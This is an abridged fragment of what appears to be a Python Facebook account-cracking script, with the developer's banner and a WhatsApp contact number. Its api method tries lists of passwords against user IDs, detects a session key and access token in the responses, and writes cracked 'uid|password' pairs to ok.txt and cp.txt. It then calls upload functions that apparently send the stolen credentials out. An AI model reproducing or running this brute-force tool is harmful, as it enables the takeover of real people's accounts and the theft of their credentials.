...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +2347041126122")
	subprocess.check_output(["am", "start", "https://wa.me/+2347041126122"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/whoami242404/past/blob/main/a.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 > \033[0;92mDEVELOPER     : WHOAMI
 > \033[0;95mFACEBOOK ID   : WHOAMI TV
 > \033[0;41mWHATSAPP      : 07041126122
 \033[0;96m> YOUTUBE       : LOVELY
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[whoami-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [whoami-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[whoami-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [whoami-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
